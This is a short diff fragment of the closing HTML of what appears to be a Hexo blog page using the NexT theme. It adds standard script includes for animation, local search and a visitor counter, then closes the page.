+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  
+</body>
+</html>
